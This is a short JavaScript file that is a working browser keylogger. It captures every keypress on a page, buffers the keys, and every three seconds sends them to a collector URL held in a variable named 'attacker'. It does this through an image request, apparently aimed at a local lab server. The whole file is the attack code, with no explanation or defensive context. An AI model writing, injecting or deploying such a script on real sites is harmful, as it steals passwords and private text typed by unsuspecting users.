var buffer = "";
var attacker = 'http://localhost:4000/logme/?c='

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        //t: timestamp
    };
    buffer += ("" + e.key);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        //var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + buffer
        buffer = "";
    }
}, 3000);
